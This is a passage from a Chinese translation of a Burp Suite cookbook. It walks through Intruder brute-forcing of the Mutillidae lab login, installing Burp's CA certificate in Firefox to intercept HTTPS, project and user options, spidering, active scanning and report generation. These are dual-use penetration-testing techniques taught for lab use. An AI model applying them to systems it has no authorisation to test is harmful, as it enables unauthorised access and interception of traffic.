开始攻击后，Intruder 创建了一个攻击表。**攻击结果**部分提供了一些关于在表中捕获的内容的设置。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00047.jpeg)

# Grep - Match

**Grep - Match**是一个非常有用的功能，当启用时，会在攻击表结果中创建额外的列，以快速识别错误、异常，甚至是响应中的自定义字符串。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00048.jpeg)

# Grep - Extract

**Grep - Extract**，当启用时，是在攻击表中添加一个列的另一个选项，其标签是在响应中找到的特定字符串。这个选项不同于**Grep - Match**，因为 Grep - Extract 的值是从实际的 HTTP 响应中取得的，而不是任意字符串。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00049.jpeg)

# Grep - Payloads

**Grep - Payloads**提供了测试人员在攻击表中添加列的能力，其中响应包含负载的反射。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00050.jpeg)

# 重定向

**重定向**指示 Intruder 永远不要、有条件地或总是跟随重定向。这个功能非常有用，特别是在暴力破解登录时，因为 302 重定向通常表示进入的迹象。

为了这个食谱的目的，保持默认设置不变：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00051.jpeg)

# 开始攻击按钮

最后，我们准备开始 Intruder。在**负载**或**选项**选项卡上，单击**开始攻击**按钮开始：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00052.jpeg)

攻击开始后，将出现一个攻击结果表。这允许测试人员使用负载标记位置内的负载来审查所有请求。它还允许我们审查所有响应和显示**状态**、**错误**、**超时**、**长度**和**注释**的列。

为了这个食谱的目的，我们注意到在`password`参数的 admin 负载产生了状态码`302`，这是一个重定向。这意味着我们成功登录了 Mutillidae 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00053.jpeg)

在攻击表中查看**响应** | **渲染**，可以让我们看到 Web 应用程序如何响应我们的负载。正如你所看到的，我们成功地以管理员身份登录了：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00054.jpeg)


# 第三章：使用 Burp 进行配置、爬行、扫描和报告

在本章中，我们将介绍以下示例：

+   建立 HTTPS 信任

+   设置项目选项

+   设置用户选项

+   使用爬虫进行爬行

+   使用扫描器进行扫描

+   报告问题

# 介绍

本章帮助测试人员校准 Burp 设置，使其对目标应用程序的影响减少。爬虫和扫描器选项中的调整可以帮助解决此问题。同样，当测试人员试图到达目标时，可能会遇到有趣的网络情况。因此，本章还包括了针对运行在 HTTPS 上的站点或仅可通过 SOCKS 代理或端口转发访问的站点的测试的几条建议。这些设置在项目和用户选项中都可以找到。最后，Burp 提供了生成问题报告的功能。

# 软件工具要求

为了完成本章的示例，您需要以下内容：

+   OWASP 破损 Web 应用程序（VM）

+   OWASP Mutillidae 链接

+   Burp 代理社区版或专业版([`portswigger.net/burp/`](https://portswigger.net/burp/))

+   配置了允许 Burp 代理流量的 Firefox 浏览器([`www.mozilla.org/en-US/firefox/new/`](https://www.mozilla.org/en-US/firefox/new/))

+   代理配置步骤在章节中有详细介绍

# 建立 HTTPS 信任

由于大多数网站实施**超文本传输安全协议**（**HTTPS**），了解如何使 Burp 能够与这些站点通信是有益的。HTTPS 是在**超文本传输协议**（**HTTP**）上运行的加密隧道。

HTTPS 的目的是加密客户端浏览器和 Web 应用程序之间的流量，以防止窃听。但是，作为测试人员，我们希望允许 Burp 进行窃听，因为这是使用拦截代理的目的。Burp 提供了一个由**证书颁发机构**（**CA**）签名的根证书。该证书可用于在 Burp 和目标 Web 应用程序之间建立信任。

默认情况下，Burp 的代理在与运行在 HTTPS 上的目标建立加密握手时可以生成每个目标的 CA 证书。这解决了隧道的 Burp 到 Web 应用程序部分。我们还需要解决浏览器到 Burp 部分。

为了在客户端浏览器、Burp 和目标应用程序之间创建完整的 HTTPS 隧道连接，客户端需要在浏览器中信任 PortSwigger 证书作为受信任的权威。

# 准备工作

在需要对运行在 HTTPS 上的网站进行渗透测试的情况下，测试人员必须将 PortSwigger CA 证书导入其浏览器，作为受信任的权威。

# 如何做...

确保 Burp 已启动并运行，然后执行以下步骤：

1.  打开 Firefox 浏览器到[`burp`](http://burp) URL。您必须按照显示的 URL 精确输入才能到达此页面。您应该在浏览器中看到以下屏幕。请注意右侧标有 CA 证书的链接。单击该链接以下载 PortSwigger CA 证书：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00055.jpeg)

1.  系统会提示您下载 PortSwigger CA 证书的对话框。该文件标记为`cacert.der`。将文件下载到硬盘上的某个位置。

1.  在 Firefox 中，打开 Firefox 菜单。单击选项。

1.  在左侧单击隐私和安全，滚动到`证书`部分。单击“查看证书...”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00056.jpeg)

1.  选择权限选项卡。单击导入，选择之前保存的 Burp CA 证书文件，然后单击打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00057.jpeg)

1.  在弹出的对话框中，选中“信任此 CA 以识别网站”复选框，然后单击确定。在证书管理器对话框上也单击确定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00058.jpeg)

关闭所有对话框并重新启动 Firefox。如果安装成功，您现在应该能够通过 Burp 代理访问浏览器中的任何 HTTPS URL，而无需任何安全警告。

# 设置项目选项

项目选项允许测试人员保存或设置特定于项目或范围目标的配置。在项目选项卡下有多个子选项卡可用，包括连接、HTTP、SSL、会话和其他。在评估特定目标时，许多这些选项对于渗透测试人员是必需的，这就是为什么它们在这里被介绍的原因。

# 如何操作...

在本书中，我们不会使用许多这些功能，但了解它们的存在并理解它们的目的仍然很重要：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00059.jpeg)

# 连接选项卡

在连接选项卡下，测试人员有以下选项：

+   **平台认证**：在测试人员希望项目选项与针对目标应用程序使用的身份验证类型覆盖用户选项中的任何身份验证设置时，提供了一个覆盖按钮。

单击复写用户选项的复选框后，测试人员将看到一个表格，其中包含针对目标应用程序的身份验证选项（例如基本、NTLMv2、NTLMv1 和摘要）。目标主机通常设置为通配符`*`，以防测试人员有必要使用此选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00060.jpeg)

+   **上游代理服务器**：在测试人员希望项目选项与针对目标应用程序使用的上游代理服务器配置覆盖用户选项中包含的任何代理设置时，提供了一个覆盖按钮。

单击复写用户选项的复选框后，测试人员将看到一个表格，其中包含针对该项目的上游代理选项。单击“添加”按钮会显示一个名为“添加上游代理规则”的弹出框。此规则特定于目标应用程序的环境。如果目标应用程序的环境是由需要与应用程序登录不同一组凭据的 Web 代理前端，则此功能非常有用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00061.jpeg)

+   **SOCKS 代理**：在测试人员希望项目选项与针对目标应用程序使用的 SOCKS 代理配置覆盖用户选项中的任何 SOCKS 代理设置时，提供了一个覆盖按钮。

单击复写用户选项的复选框后，测试人员将看到一个表单，用于配置特定于该项目的 SOCKS 代理。在某些情况下，Web 应用程序必须通过使用套接字连接和身份验证的附加协议进行访问，通常称为 SOCKS：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00062.jpeg)

+   **超时**：它允许设置不同网络场景的超时设置，例如无法解析域名：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00063.jpeg)

+   **主机名解析**：它允许类似于本地计算机上主机文件的条目来覆盖**域名系统**（**DNS**）解析：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00064.jpeg)

+   **超出范围的请求**：它提供了关于超出范围的请求的规则给 Burp。通常情况下，最常用的是使用套件范围[在目标选项卡中定义]的默认设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00065.jpeg)

# HTTP 选项卡

在 HTTP 选项卡下，测试人员有以下选项：

+   **重定向**：它提供了 Burp 在配置重定向时遵循的规则。通常情况下，这里使用默认设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00066.jpeg)

+   **流式响应**：它提供了与无限流响应相关的配置。通常情况下，这里使用默认设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00067.jpeg)

+   **状态 100 响应**：它提供了 Burp 处理 HTTP 状态码 100 响应的设置。通常情况下，这里使用默认设置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00068.jpeg)

# SSL 选项卡

在 SSL 选项卡下，测试人员有以下选项：

+   SSL 协商：当 Burp 通过 SSL 与目标应用程序通信时，此选项提供了使用预配置的 SSL 密码或指定不同密码的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00069.jpeg)

如果测试人员希望自定义密码，他们将单击“使用自定义协议和密码”单选按钮。出现一个表格，允许选择 Burp 在与目标应用程序通信中可以使用的协议和密码：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00070.jpeg)

+   **客户端 SSL 证书**：它提供了一个覆盖按钮，以便测试人员必须针对目标应用程序使用客户端证书。此选项将取代用户选项中配置的任何客户端证书。

单击复写用户选项的复选框后，测试人员将看到一个表格，用于配置特定于该项目的客户端证书。您必须拥有客户端证书的私钥才能成功导入到 Burp 中：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00071.jpeg)

+   **服务器 SSL 证书**：它提供了服务器端证书的列表。测试人员可以双击任何这些行项目以查看每个证书的详细信息：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00072.jpeg)

# 会话选项卡

本书将涵盖第十章中会话选项卡中包含的所有功能，*使用 Burp 宏和扩展程序*。这里提供了会话选项卡中每个部分的审查，以确保完整性。

在会话选项卡下，测试人员有以下选项：

+   **会话处理规则**：它提供了在评估 Web 应用程序时配置自定义会话处理规则的能力：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00073.jpeg)

+   **Cookie Jar**：它提供了 Burp 代理（默认情况下）捕获的 cookie、域、路径和名称/值对的列表：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00074.jpeg)

+   **宏**：它提供了测试人员编写先前执行的任务以自动化与目标应用程序交互的能力：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00075.jpeg)

# 杂项选项卡

在杂项选项卡下，测试人员有以下选项：

+   **计划任务**：它提供了在特定时间安排活动的能力：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00076.jpeg)

单击“添加”按钮后，弹出窗口显示可用于调度的活动类型：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00077.jpeg)

+   **Burp Collaborator 服务器**：它提供了使用目标应用程序外部服务的能力，以发现目标应用程序中的漏洞。本书将在第十一章中涵盖与 Burp Collaborator 相关的配方，*实施高级主题攻击*。这里提供了该部分的审查，以确保完整性：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00078.jpeg)

+   **日志记录**：它提供了记录所有请求和响应或基于特定工具筛选日志的能力。如果选择，用户将被提示输入文件名和位置，以保存日志文件在本地机器上：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00079.jpeg)

# 设置用户选项

用户选项允许测试人员保存或设置特定于启动时 Burp 的配置。用户选项选项卡下有多个子选项卡可用，包括连接、SSL、显示和杂项。在本书的配方中，我们不会使用任何用户选项。但是，这里提供了信息以确保完整性。

# 如何做到这一点...

使用 Burp 用户选项，让我们根据您的渗透测试需求最佳地配置 Burp UI。连接选项卡下的每个项目已经在本章的项目选项部分中涵盖，因此，我们将直接从 SSL 选项卡开始。

# SSL 选项卡

在 SSL 选项卡下，测试人员有以下选项：

+   **Java SSL 选项**：它提供了配置 Burp 用于 SSL 连接的 Java 安全库的能力。默认值最常用：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00080.jpeg)

+   **客户端 SSL 证书**：此部分已在本章的*项目选项*部分中涵盖。

# 显示选项卡

在显示选项卡下，测试人员有以下选项：

+   用户界面：它提供了修改 Burp UI 本身的默认字体和大小的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00081.jpeg)

+   HTTP 消息显示：它提供了修改消息编辑器中显示的所有 HTTP 消息的默认字体和大小的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00082.jpeg)

+   字符集：它提供了更改 Burp 确定使用的字符集的能力，以使用特定集或显示原始字节：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00083.jpeg)

+   HTML 渲染：它控制可在 HTTP 响应上的 Render 选项卡中找到的 HTML 页面的显示方式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00084.jpeg)

# 其他选项卡

在其他选项卡下，测试人员有以下选项：

+   快捷键：它允许用户为常用命令配置快捷键：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00085.jpeg)

+   自动项目备份[仅磁盘项目]：它提供了确定多久备份项目文件的备份副本的能力。默认情况下，使用 Burp Professional 时，备份设置为每 30 分钟发生一次：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00086.jpeg)

+   临时文件位置：它提供了在运行 Burp 时更改临时文件存储位置的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00087.jpeg)

+   代理拦截：它提供了在初始启动 Burp 时始终启用或始终禁用代理拦截的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00088.jpeg)

+   代理历史记录：它提供了在目标范围更改时自定义提示超出范围项目的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00089.jpeg)

+   性能反馈：它为 PortSwigger 提供了关于 Burp 性能的匿名数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00090.jpeg)

# 使用 Spider 进行爬行

Spidering 是映射或爬行 Web 应用程序的另一个术语。这种映射练习对于发现目标应用程序中存在的链接、文件夹和文件是必要的。

除了爬行，Burp Spider 还可以以自动方式提交表单。爬行应该在扫描之前进行，因为渗透测试人员希望在寻找漏洞之前识别所有可能的路径和功能。

Burp 提供了持续的爬行能力。这意味着随着渗透测试人员发现新内容，Spider 将自动在后台运行，寻找要添加到目标|站点地图中的表单、文件和文件夹。

Burp Suite 的 Spider 模块中有两个选项卡可用。这些选项卡包括**控制**和**选项**，我们将在本食谱的*准备就绪*部分中学习。

# 准备就绪

使用在 OWASP BWA VM 中找到的 OWASP Mutillidae II 应用程序，我们将配置并使用 Burp Spider 来爬行该应用程序。

# 控制选项卡

在控制选项卡下，测试人员有以下选项：

+   Spider 状态：它提供了打开或关闭（暂停）爬虫功能的能力。它还允许我们监视排队的 Spider 请求以及传输的字节数等。该部分允许通过单击“清除队列”按钮来清除任何排队的表单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00091.jpeg)

+   Spider 范围：它提供了根据目标|站点地图选项卡或自定义范围设置 Spider 范围的能力：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00092.jpeg)

如果单击“使用自定义范围”单选按钮，则会出现两个表，允许测试人员定义要包括和排除范围的 URL：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00093.jpeg)

# 选项卡

在选项卡下，测试人员有以下选项：

+   爬虫设置：它提供了调节 Spider 将跟随的链接深度的能力；还可以识别要在网站上为 Spider 提供的基本 Web 内容，例如`robots.txt`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00094.jpeg)

+   被动爬行：在后台爬行新发现的内容，默认情况下已打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00095.jpeg)

+   表单提交：它提供了确定 Spider 与表单交互方式的能力。有几个选项可用，包括忽略、寻求指导、使用在提供的表中找到的默认值提交，或者使用任意值（例如，`555-555-0199@example.com`）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00096.jpeg)

+   **应用登录**：它提供了确定 Spider 如何与登录表单交互的能力。有几个选项可用，包括忽略、寻求指导、提交为标准表单提交，或使用文本框中提供的凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00097.jpeg)

+   **Spider 引擎**：它提供了编辑使用的线程数以及由于网络故障而进行的重试尝试设置的能力。要谨慎使用线程数，因为太多的线程请求可能会使应用程序受阻并影响其性能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00098.jpeg)

+   **请求头**：它提供了修改 Burp Spider 发出的 HTTP 请求外观的能力。例如，测试人员可以修改用户代理以使 Spider 看起来像一个手机：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00099.jpeg)

# 如何操作...

1.  确保 Burp 和 OWASP BWA VM 正在运行，并且 Burp 已经配置在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中。

1.  从 OWASP BWA 登陆页面，点击链接到 OWASP Mutillidae II 应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00100.jpeg)

1.  转到 Burp Spider 选项卡，然后转到 Options 子选项卡，向下滚动到 Application Login 部分。选择自动提交这些凭据的单选按钮。在用户名文本框中输入单词 `admin`；在密码文本框中输入单词 `admin`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00101.jpeg)

1.  返回到目标 | 网站地图，并确保通过右键单击 `mutillidae` 文件夹并选择添加到范围来添加 `mutillidae` 文件夹到范围中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00102.jpeg)

1.  可选地，你可以通过点击 `Filter: Hiding out of scope and not found items; hiding CSS, image and general binary content; hiding 4xx responses; hiding empty folders` 来清理 Site map，只显示范围内的项目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00103.gif)

1.  点击 `Filter: ….` 后，你会看到一个下拉菜单出现。在这个下拉菜单中，勾选“仅显示范围内项目”框。现在，点击下拉菜单之外的任何地方，让过滤器再次消失：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00104.jpeg)

1.  现在你应该有一个干净的网站地图。右键单击 mutillidae 文件夹，然后选择 Spider this branch。

如果提示允许超出范围的项目，请点击是。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00105.jpeg)

1.  你应该立即看到 Spider 选项卡变成橙色：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00106.jpeg)

1.  转到 Spider | Control 选项卡，查看请求数量、传输的字节数以及队列中的表单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00107.jpeg)

让 Spider 完成运行。

1.  注意，Spider 使用你在选项卡中提供的凭据登录到了应用程序。在 Target | Site map 中，寻找 `/mutillidae/index.php/` 文件夹结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00108.jpeg)

1.  搜索包含 `password=admin&login-php-submit-button=Login&username=admin` 的信封图标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00109.jpeg)

这证明了 Spider 使用了你在 Spider | Options | Application Login 部分提供的信息。

# 使用扫描器进行扫描

扫描器功能仅在 Burp 专业版中可用。

Burp Scanner 是一个自动搜索应用程序运行时内部弱点的工具。扫描器尝试根据应用程序的行为来发现安全漏洞。

扫描器将识别可能导致发现安全漏洞的指标。Burp Scanner 非常可靠，但是在报告之前，渗透测试人员有责任验证任何发现。

Burp Scanner 有两种扫描模式可用：

+   **被动扫描器**：分析通过代理监听器传递的流量。这就是为什么正确配置目标范围非常重要，这样你就不会扫描更多不必要的内容。

+   **主动扫描器**：发送许多经过修改的请求。这些请求修改旨在触发可能指示应用程序存在漏洞的行为（[`portswigger.net/kb/issues`](https://portswigger.net/kb/issues)）。主动扫描器专注于可能存在于应用程序客户端和服务器端的基于输入的错误。

扫描任务应在蜘蛛完成后进行。之前，我们学习了蜘蛛在发现新内容时继续爬行。同样，被动扫描在应用程序爬行时继续识别漏洞。

在选项选项卡下，测试人员有以下选项：问题活动、扫描队列、实时扫描、问题定义和选项：

+   **问题活动**：以表格形式显示所有扫描器发现的问题；包括被动和主动扫描器问题：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00110.jpeg)

通过在表中选择问题，将显示消息详细信息，包括与发现相关的特定建议以及与请求和响应相关的消息编辑器详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00111.jpeg)

+   **扫描队列**：显示正在运行的主动扫描器的状态；提供每个运行线程的完成百分比，以及发送的请求数、测试的插入点、开始时间、结束时间、目标主机和攻击的 URL。

扫描仪可以通过右键单击并选择暂停扫描仪来暂停扫描; 同样，扫描仪也可以通过右键单击并选择恢复扫描仪来恢复。等待扫描队列中的项目也可以被取消：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00112.jpeg)

+   **实时主动扫描**：它允许自定义主动扫描器何时执行扫描活动：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00113.jpeg)

+   **实时被动扫描**：它允许自定义被动扫描器何时执行扫描活动。默认情况下，被动扫描器始终处于开启状态并扫描所有内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00114.jpeg)

+   **问题定义**：显示 Burp 扫描器（主动和被动）已知的所有漏洞的定义。列表可以通过扩展器进行扩展，但是，使用 Burp 核心，这是详尽的列表，包括标题、描述文本、修复措施措辞、参考和严重级别：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00115.jpeg)

+   **选项**：提供了几个部分，包括攻击插入点、主动扫描引擎、攻击扫描优化和静态代码分析。

+   **攻击插入点**：它允许自定义 Burp 插入点; 插入点是请求不同位置内的有效负载的占位符。这类似于第二章中讨论的入侵者有效负载标记概念，*了解 Burp 套件工具*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00116.jpeg)

建议在进行评估时添加 URL-to-body、Body-to-URL、cookie-to-URL、URL-to-cookie、body-to-cookie 和 cookie-to-body 插入点。这允许 Burp 对任何给定请求中几乎所有可用的参数进行模糊处理。

+   +   **主动扫描引擎**：它提供了配置线程数（例如，并发请求限制）的能力，扫描器将针对目标应用程序运行。这个线程计数，加上插入点的排列组合，可能会在网络上产生噪音和可能的 DOS 攻击，这取决于目标应用程序的稳定性。请谨慎使用，并考虑降低并发请求限制。线程的限制也可以在此配置部分中找到：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00117.jpeg)

+   +   **攻击扫描优化**：它提供了三种扫描速度和扫描准确性的设置。

+   可用的扫描速度设置包括正常、快速和彻底。快速会发出更少的请求并检查问题的派生。彻底会发出更多的请求并检查问题的派生。正常是另外两个选择之间的中等设置。扫描速度的建议是彻底。

+   可用的扫描准确性设置包括正常、最小化假阴性和最小化假阳性。扫描准确性与扫描器在报告问题之前需要的证据量有关。扫描准确性的建议是正常的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00118.jpeg)

+   +   **静态代码分析**：它提供对二进制代码进行静态分析的能力。默认情况下，此检查是在主动扫描中执行的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00119.jpeg)

+   **扫描问题**：它提供了设置要测试的漏洞以及要使用哪个扫描器（即被动或主动）的能力。默认情况下，所有漏洞检查都是启用的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00120.jpeg)

# 准备工作

使用 OWASP BWA VM 中的 OWASP Mutillidae II 应用程序，我们将开始我们的扫描过程，并使用扫描队列选项卡监视我们的进度。

# 操作步骤...

确保 Burp 和 OWASP BWA VM 正在运行，同时在用于查看 OWASP BWA 应用程序的 Firefox 浏览器中配置了 Burp。

从 OWASP BWA 登录页面，点击链接到 OWASP Mutillidae II 应用程序：

1.  从目标 | 站点地图选项卡中，右键单击`mutillidae`文件夹并选择被动扫描此分支。被动扫描器将寻找漏洞，这些漏洞将出现在问题窗口中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00121.jpeg)

1.  从目标 | 站点地图选项卡中，右键单击`mutillidae`文件夹并选择主动扫描此分支：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00122.jpeg)

1.  在启动主动扫描器时，将弹出一个对话框，提示删除重复项、没有参数的项、具有媒体响应的项或特定文件类型的项。这个弹出框是主动扫描向导。对于本教程，请使用默认设置并点击“下一步”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00123.jpeg)

1.  验证所有显示的路径是否需要进行扫描。任何不需要的文件类型或路径都可以使用“删除”按钮进行移除。完成后，点击“确定”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00124.jpeg)

您可能会收到关于超出范围的项目的提示。如果是这样，请点击“是”以包括这些项目。扫描器将开始工作。

1.  通过查看扫描器队列选项卡来检查扫描器的状态：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00125.jpeg)

1.  扫描器发现问题后，它们会显示在目标选项卡的问题面板中。由于这个面板是专业版才有的，因为它补充了扫描器的功能：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00126.jpeg)

# 报告问题

报告功能仅在 Burp Professional 版中提供。

在 Burp Professional 中，当扫描器发现漏洞时，它将被添加到 UI 右侧的目标选项卡上找到的问题列表中。问题以颜色编码表示严重程度和置信水平。带有红色感叹号的问题意味着严重程度很高，置信水平是确定的。例如，这里显示的 SQL 注入问题包含这两个属性。

具有较低严重程度或置信水平的项目将是低级、信息性的，颜色为黄色、灰色或黑色。这些项目需要手动渗透测试，以验证漏洞是否存在。例如，响应中返回的输入是扫描器识别的潜在漏洞，如下面的屏幕截图所示。这可能是**跨站脚本**（**XSS**）的攻击向量，也可能是误报。这取决于渗透测试人员及其经验水平来验证此类问题：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00127.jpeg)

+   **严重程度级别**：可用的严重程度级别包括高、中、低、信息和误报。任何标记为误报的发现将不会出现在生成的报告中。误报是必须由渗透测试人员手动设置的严重程度级别。

+   **置信水平**：可用的置信水平包括确定、肯定和暂定。

# 准备工作

扫描过程完成后，我们需要验证我们的发现，相应地调整严重程度，并生成报告。

# 操作步骤...

1.  对于本教程，请在“问题”标题下选择“未设置 HttpOnly 标志的 Cookie”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00128.jpeg)

1.  查看消息的响应选项卡以验证发现。我们可以清楚地看到`PHPSESSID` cookie 没有设置`HttpOnly`标志。因此，我们可以将严重程度从低改为高，将置信水平从确定改为肯定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00129.jpeg)

1.  右键单击问题，并通过选择“设置严重程度 | 高”将严重程度更改为高：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00130.jpeg)

1.  右键单击问题，并通过选择设置置信度 | 确定将严重性更改为确定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00131.jpeg)

1.  对于这个示例，选择包括在报告中的具有最高置信度和严重级别的问题。在这里选择（高亮显示+ *Shift*键）所显示的项目后，右键单击并选择报告所选问题：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00132.jpeg)

点击报告所选问题后，弹出框会提示我们报告的格式。这个弹出框是 Burp Scanner 报告向导。

1.  对于这个示例，允许 HTML 的默认设置。点击下一步。

1.  该屏幕提示输入报告中要包括的详细信息类型。对于这个示例，允许默认设置。点击下一步。

1.  该屏幕提示报告中消息应该如何显示。对于这个示例，允许默认设置。点击下一步。

1.  该屏幕提示应该在报告中包括哪些类型的问题。对于这个示例，允许默认设置。点击下一步。

1.  该屏幕提示输入报告保存的位置。对于这个示例，点击选择文件…，选择一个位置，并提供一个文件名，后面跟着`.html`扩展名；允许所有其他默认设置。点击下一步：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00133.jpeg)

1.  该屏幕反映了报告生成的完成。点击关闭并浏览到文件的保存位置。

1.  双击文件名将报告加载到浏览器中：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/bpst-cb/img/00134.jpeg)

恭喜！您已经创建了您的第一个 Burp 报告！


